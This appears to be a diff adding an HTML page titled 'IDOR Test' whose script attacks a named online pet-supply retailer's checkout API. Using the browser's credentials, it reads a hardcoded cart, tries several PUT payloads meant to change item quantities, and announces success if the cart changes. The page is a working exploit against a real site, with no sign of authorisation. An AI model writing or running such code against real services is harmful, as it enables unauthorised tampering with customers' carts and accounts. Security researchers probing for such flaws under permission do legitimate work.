@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head><title>IDOR Test</title></head>
+<body>
+<script>
+const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
+(async function() {
+  console.log("[*] Starting IDOR Write Test...");
+  const cartBefore = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {credentials: 'include'}).then(r => r.json());
+  const beforeCount = cartBefore.articles.length;
+  const beforeTotal = cartBefore.summary.grandTotal;
+  const articleId = cartBefore.articles[0]?.id;
+  const cartId = cartBefore.cartId;
+  const sid = cartBefore.sid;
+  console.log(`[+] Before: ${beforeCount} items, ${beforeTotal} EUR, Article: ${articleId}`);
+  const payloads = [
+    {name: "articleId+quantity", p: {articleId: articleId, quantity: 2}},
+    {name: "id+quantity", p: {id: articleId, quantity: 2}},
+    {name: "With cartUuid", p: {articleId: articleId, quantity: 2, cartUuid: CART_UUID}},
+    {name: "With sid", p: {articleId: articleId, quantity: 2, sid: sid}},
+    {name: "With cartId", p: {articleId: articleId, quantity: 2, cartId: cartId}},
+    {name: "Full", p: {articleId: articleId, quantity: 2, cartUuid: CART_UUID, sid: sid, cartId: cartId}}
+  ];
+  for (const test of payloads) {
+    console.log(`[*] Testing: ${test.name}`);
+    try {
+      const r = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
+        method: "PUT", credentials: "include",
+        headers: {"Content-Type": "application/json", "Accept": "application/json"},
+        body: JSON.stringify(test.p)
+      });
+      const ct = r.headers.get("content-type") || "";
+      const text = await r.text();
+      console.log(`    Status: ${r.status}, CT: ${ct}`);
+      if (r.status === 200 && ct.includes("json")) {
+        try {
+          const json = JSON.parse(text);
+          console.log(`    [!!!] SUCCESS! JSON:`, JSON.stringify(json).substring(0, 150));
+          break;
+        } catch(e) {}
+      }
+    } catch(e) { console.log(`    Error: ${e.message}`); }
+  }
+  const cartAfter = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {credentials: 'include'}).then(r => r.json());
+  const afterCount = cartAfter.articles.length;
+  const afterTotal = cartAfter.summary.grandTotal;
+  console.log(`[+] After: ${afterCount} items, ${afterTotal} EUR`);
+  if (afterCount !== beforeCount || Math.abs(afterTotal - beforeTotal) > 0.01) {
+    console.log("\n[!!!] CRITICAL IDOR WRITE CONFIRMED!");
+    console.log(`[!!!] Before: ${beforeCount} items, ${beforeTotal} EUR`);
+    console.log(`[!!!] After: ${afterCount} items, ${afterTotal} EUR`);
+    document.body.innerHTML = `<h1 style="color:green">SUCCESS! IDOR Write Confirmed!</h1><p>Before: ${beforeCount} items, ${beforeTotal} EUR<br>After: ${afterCount} items, ${afterTotal} EUR</p>`;
+  } else {
+    console.log("\n[!] Cart unchanged");
+    document.body.innerHTML = `<h1 style="color:orange">Cart Unchanged</h1><p>Need to find correct payload format</p>`;
+  }
+})();
+</script>
+</body>
+</html>
+
